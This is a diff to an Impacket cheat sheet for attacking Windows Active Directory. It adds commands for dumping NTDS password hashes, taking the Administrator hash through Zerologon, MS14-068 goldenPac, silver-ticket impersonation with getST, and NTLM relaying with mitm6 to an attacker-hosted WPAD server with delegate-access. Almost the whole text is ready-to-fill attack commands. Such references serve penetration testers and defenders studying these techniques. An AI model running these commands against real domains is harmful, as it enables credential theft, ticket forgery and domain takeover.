@@ -52,9 +52,19 @@ getArch.py -target <ip>
 netview.py <domain>/<user> -target <ip> -users <users_file>
 ```
 
-## secretdump
+## secretsdump
 ```
 secretsdump.py '<domain>/<user>:<pass>'@<ip>
+```
+
+## secretsdump local dump hash
+```
+secretsdump.py  -ntds <ntds_file.dit> -system <SYSTEM_FILE> -hashes lmhash:nthash LOCAL -outputfile <ntlm-extract-file>
+```
+
+## secretsdump - anonymous get administrator (zerologon)
+```
+secretsdump.py <domain>/<dc_bios_name>\$/@<ip> -no-pass -just-dc-user "Administrator"
 ```
 
 % impacket, windows, exec
@@ -96,7 +106,7 @@ atexec.py -hashes <hash> <user>@<ip> "command"
 
 % impacket, windows, kerberos, 88
 
-## GetNPUsers without password to get TGT
+## GetNPUsers without password to get TGT (ASREPRoast)
 ```
 GetNPUsers.py <domain>/<user> -no-pass -request -format hashcat
 ```
@@ -111,6 +121,11 @@ GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat
 GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>
 ```
 
+## MS14-068 - goldenPac
+```
+goldenPac.py -dc-ip <dc_ip> <domain>/<user>:'<password>'@<target>
+```
+
 ## Ticketer - (golden ticket) - generate TGT/TGS tickets into ccache format which can be converted further into kirbi.
 ```
 ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
@@ -119,6 +134,11 @@ ticketer.py -nthash <nthash> -domain-sid <domain_sid> -domain <domain> <user>
 ## TicketConverter - convert kirbi files (commonly used by mimikatz) into ccache files used by impacket
 ```
 ticketConverter.py <ccache_ticket_file> <ticket_kirbi_file>
+```
+
+## Silver ticket - impresionate user
+```
+getST.py -spn cifs/<target> <domain>/<netbios_name>\$ -impersonate <user>
 ```
 
 ## GetTGT - request a TGT and save it as ccache for given a password, hash or aesKey
@@ -136,7 +156,17 @@ GetADUSers.py -all <domain>/<user>:<password> -dc-ip <dc_ip>
 impacket-ntlmrelayx -tf <targets_file> -e <payload_file>
 ```
 
-## ntlmrelay - to use with mitm6
+## ntlmrelay - to use with mitm6 - relay to client
 ```
-impacket-ntlmrelayx -wh <ip_server_hosting_wpad_file> -t smb://<target_ip>/ -i
+ntlmrelayx.py -6 -wh <attacker_ip> -l /tmp -socks -debug
+```
+
+## ntlmrelay - to use with mitm6 - relay to target
+```
+ntlmrelayx.py -6 -wh <attacker_ip> -t smb://<target> -l /tmp -socks -debug
+```
+
+## ntlmrelay - to use with mitm6 - delegate access
+```
+ntlmrelayx.py -t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access
 ```
